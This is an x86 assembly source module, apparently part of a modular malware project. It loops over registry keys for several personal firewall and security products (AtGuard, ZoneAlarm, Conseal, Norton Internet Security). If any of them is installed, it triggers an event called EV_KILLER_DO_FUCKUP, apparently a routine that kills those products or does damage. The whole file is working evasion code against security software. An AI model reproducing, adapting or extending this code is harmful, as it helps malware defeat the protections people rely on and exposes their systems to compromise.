
include                 ..\..\INCLUDE\consts.inc
include                 ..\MAIN\main.inc
include                 ..\KILLER\killer.inc

                        extrn   Event:PROC
                        public  HandleEvent

                        p386
                        model   flat
                        locals  __
                        jumps

                        .data

check_complete          db      0

key1                    db      'Software\WRQ',0        ; atguard
key2                    db      'Software\Zone Labs',0  ; zonealarm
key3                    db      'Security\Signal9',0    ; conseal
key4                    db      'Software\Symantec\IAM',0  ; norton inet secur.

key_start:
                        dd      key1
                        dd      key2
                        dd      key3
                        dd      key4
key_end:

hKey                    dd      ?

                        .code

HandleEvent:
                        mov     eax, [esp+4]    ; event_id

                        cmp     eax, EV_MAIN_IDLE
                        je      __check

__return_0:             xor     eax, eax
                        retn

__check:
                        cmp     check_complete, 0
                        jne     __return_0
                        inc     check_complete

                        lea     edx, key_start
__cycle:                push    edx

                        push    dword ptr [edx]
                        push    HKEY_LOCAL_MACHINE
                        callW   is_key

                        pop     edx

                        or      eax, eax
                        jnz     __oops          ; 1=exists

                        add     edx, 4
                        cmp     edx, offset key_end
                        jb      __cycle

__return_1:             mov     eax, 1
                        retn

__oops:                 push    0
                        push    EV_KILLER_DO_FUCKUP
                        call    Event
                        add     esp,8

                        jmp     __return_1

                        end
